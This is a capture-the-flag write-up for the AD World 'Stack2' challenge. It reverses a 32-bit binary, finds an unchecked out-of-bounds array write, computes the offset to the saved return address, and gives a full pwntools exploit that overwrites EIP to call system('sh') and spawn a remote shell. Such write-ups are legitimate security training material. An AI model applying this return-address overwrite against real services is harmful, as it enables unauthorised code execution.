<h3> AD World Challenges </h3>

- Name: Stack2
- Source: [chall](https://adworld.xctf.org.cn/media/file/task/3fb1a42837be485aae7d85d11fbc457b)
  
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/81c32a17-233b-412d-acf0-db0748e6e314)

**File Checks**

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ccf4116-0ba9-44eb-9e2a-a0750b72403f)

So we are working with a x86 executable which is dynamically linked and not stripped

And the protections enabled are: Canary & NX

Running the binary to get an overview of what it does shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3ca880da-0072-4aec-90d3-2ededf7d4947)

Basically this binary provides us with a calculator like structure where we can perform about 4 operations on
- Show numbers
- Add number
- Change number
- Get average

Now that we know that I decided to decompile the binary inorder to reverse it and find the vulnerability

**Reversing**
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac90000d-e2fa-4a06-a0bc-4f3530816523)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/722cf5e6-ce1c-4ff0-ad11-c66d86961015)

I will look through what each function does and explain 🙂

- First it will receive the number of integers we want to store in the array with it's value and the number which can be stored in the array must be less than 100 that means at most 99 values can be stored

```c
char numArray [100];

puts("How many numbers you have:");
__isoc99_scanf("%d",&idx);
puts("Give me your numbers");
for (i = 0; (i < idx && ((int)i < 100)); i = i + 1) {
  __isoc99_scanf("%d",&values);
  numArray[i] = (char)values;
}
```

Here comes the operational part of this program. In a while loop it can allow us perform 4 operations

- Option one basically iterates through every element in the `numArray` and prints it's index and value

```c
if (choice != 1) goto end;
puts("id\t\tnumber");
for (k = 0; k < cnt; k = k + 1) {
  printf("%d\t\t%d\n",k,(int)numArray[k]);
}
```

- Option two allows us add a number to the array. The number that would be added would be stored as the next element in the array

```c
if (choice != 2) break;
puts("Give me your number");
__isoc99_scanf("%d",&values);
if (cnt < 100) {
  numArray[cnt] = (char)values;
  cnt = cnt + 1;
}
```

- Option three allows us to change a number at a specified index of the array

```c
if (choice != 3) break;
puts("which number to change:");
__isoc99_scanf("%d",&idx);
puts("new number:");
__isoc99_scanf("%d",&values);
numArray[idx] = (char)values;
}
```

- Option four calculates the average of the elements of the array by taking the sum of element in the array and dividing it by the number of element stored in the array (that's what average means ^^)

```c
if (choice != 4) break;
sum = 0;
for (j = 0; j < cnt; j = j + 1) {
  sum = sum + numArray[j];
}
printf("average is %.2lf\n",(double)sum / (double)(ulonglong)cnt);
}
```

And finally if none of the options are choosen the binary goes to the *end* switch case and checks if the canary is still intact and if it is it *returns 0*

```c
end:
  if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
    return 0;
  }
```

**Exploitation**

Now you may wonder where the bug is?

Well the bug resides in option 3 

Is the reason because it would allow us specify the index position of the array we want to store our integer to? Nope!

The reason is because it doesn't check if the index position we are trying to write to is within the range of the array

Because the array can only hold up at most 200 bytes that means the operation should have made sure our index value is within range(0, 199) 

Now because of this bug we can write out of bound of the array making this bug *OOB Write (Out-Of-Bound Write)*

But what do we do with this bug? Is there anything we would want to overwrite?

Looking through the available functions I came across this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70797696-667e-4ecc-98be-3878d9cf8581)

Ok cool there's a function which would spawn a shell

That's satisfying because we can possibly call that function! Wait but how?

Because the array is stored on the stack we can use the OOB Write to overwrite the EIP before the program returns without worrying about Canary

How do we achieve that?

First we need to know the address of the array and the stack return address

For the first one looking at the assembly code in Ghidra when the number get stored in the array shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ffc3d7ec-c3d8-41b3-bc6d-05cbb91ffe6c)

That instruction would move the value of `ebp-0x70` to the `edx` register, and the *edx* register is pointing to the *array*

So I set a breakpoint at that point
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0057d20e-a2f6-42a3-8e80-02e919586d23)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/25f73ebf-2a43-428e-a4ce-7ba81739f455)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/987d2d76-93ca-4bf0-ba67-ae056205ac76)

After it does *lea edx, [ebp-0x70]* operation the current value in *edx* is the array address

```
array = edx = 0xffffcdc8
```

Now we need the stack return address which we can get by setting a breakpoint at the point the binary wants to *ret*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f602c0ee-c3e4-4eca-8394-3f886735463e)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d71dff40-45b1-483c-8861-3b4db16a8eb6)

The value stored in *esp* is the stack return address

```
ret_addr = esp = 0xffffce4c
```

Now to get the offset needed to overwrite the instruction pointer just do this:

```
ret_addr - array = 0xffffce4c - 0xffffcdc8
```

The resulting answer is `132`

Ok let's confirm it by overwriting the `eip->0x41414141`

Note that when changing number with option 3 the expected integer value is just a `DWORD -> sizeof(int)` that means if we want to overwrite the instruction pointer we would send the address one `DWORD` at a time in little endian format

Back to our test overwrite
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c1362850-2893-4fcd-be27-1af1fbfb039e)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/76fce45d-0868-4c41-acb7-57580858390e)

Nice that worked, here's the code I used to do that because doing it manually was annoying
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d8772e7a-5346-4c98-89f4-eed74c3fecaf)

Now that we achieved the *eip* control let's make it call the `hackhere` function

I grabbed the address from `gdb` and split it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a2f0fa96-3c41-4a54-be8e-7e15a323b64a)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e970e67d-6255-4efc-a434-02e4c36903ed)

```
0x0804859b  hackhere
```

Now on running the exploit worked locally
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7a79a221-0e34-4070-9c9e-fd83a05e0836)

I tried running it remotely and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac424680-5139-4229-a656-1611fc4aa327)

So apparently it doesn't have `/bin/bash` remotely that's why it stopped

I couldn't find any way to write `/bin/sh` to memory then call `system(memory)`

Later I figured instead of it doing `system('/bin/sh')` why not it do `system('sh')` basically not using full path?

Because the address of `/bin/bash` is stored on the binary if we just do like `address+0x7` it would give `sh`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/892acae6-0828-4ec0-b784-2f42c874d6e7)

But now we need to form the write payload to call `system('sh')` we can easily achieve that because we can control the `eip`

And on x86 arch argument are passed to function via the stack

Here's the final exploit code

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import tqdm
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'stack2')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+802
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def write(idx, addr):
    io.sendline(b'3')
    io.sendlineafter(b'change:', str(idx))
    io.sendlineafter(b'number:', str(addr))
    sleep(1)

def oob():
    io.recvuntil('have:')
    io.sendline('1')
    io.recvuntil('numbers')
    io.sendline('1')
    
    system = [0x08, 0x04, 0x84, 0x56][::-1]
    sh = [0x08, 0x04, 0x89,0x87][::-1]
    idx = 0x84

    info("Sending payload")

    for addr in system:
        write(idx, addr)
        idx += 0x1
    
    info("Chain one completed. EIP overwritten to: %#x", exe.plt['system'])
    sleep(2)

    for _ in range(4):
        write(idx, 0x0)
        idx += 0x1

    info("Chain two completed. EIP overwritten to: %#x", 0x0)
    sleep(2)

    for addr in sh:
        write(idx, addr)
        idx += 0x1

    info("Chain three completed. EIP overwritten to: %#x", 0x8048987)
    info("Final Chain: eip -> system@plt -> 0x0 -> sh")
    info("Spawning Shell ^^")
    sleep(2)

    io.sendline('5')

    io.interactive()

def main():
    
    init()
    oob()


if __name__ == '__main__':
    main()
```

Running it works remotely
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/610a45f3-907b-44c9-8d23-edaf803ecc80)

You can check it out as it runs here:
[![asciicast](https://asciinema.org/a/ofJa0QIAIIo63Vn0QGDsHLgRJ.svg)](https://asciinema.org/a/ofJa0QIAIIo63Vn0QGDsHLgRJ)

Overall I'd say it's an easy challenge but during the time I was solving this I spent some minutes finding way to write a string in memory but after I couldn't achieve that I figured that alternate way

So that time spent did did piss me off 🥲

Anyways thanks for reading!



